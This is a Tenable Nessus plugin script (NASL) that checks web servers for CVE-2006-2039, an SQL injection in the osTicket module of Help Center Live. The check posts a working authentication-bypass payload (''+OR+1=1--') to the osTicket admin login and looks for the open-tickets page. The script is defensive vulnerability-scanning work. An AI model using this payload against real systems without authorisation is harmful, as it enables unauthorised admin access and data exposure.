#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21306);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2006-2039");
  script_bugtraq_id(17676);
  script_osvdb_id(24899);

  script_name(english:"Help Center Live osTicket Module Multiple Unspecified SQL Injections");
  script_summary(english:"Tries to bypass authentication with a SQL injection attack");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple SQL injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Help Center Live, an open source, web-based
help desk application written in PHP. 

The version of Help Center Live installed on the remote host contains
a version of osTicket that is affected by multiple SQL injection
issues.  An unauthenticated attacker may be able to leverage these
flaws to disclose sensitive information, modify data, bypass
authentication, or launch attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=411859" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Help Center Live version 2.1.0 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/21");
 script_cvs_date("$Date: 2013/01/07 22:52:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:ubertec:help_center_live");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/helpcenterlive", "/hcl", "/helpcenter", "/live", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to gain admin access.
  url = string(dir, "/module.php?module=osTicket&file=/modules/osTicket/admin.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it looks like HCL w/ osTicket...
  if (egrep(pattern:'<input .*name="login_user"', string:res))
  {
    postdata = string(
      "login_user=", SCRIPT_NAME, "'+OR+1=1--&",
      "login_pass=", unixtime(), "&",
      "submit=Log in"
    );
    r = http_send_recv3(method: "POST", item: url, port: port,
      content_type: "application/x-www-form-urlencoded", data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we see a header for open tickets.
    if ("<b>Open Tickets</b>" >< res)
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
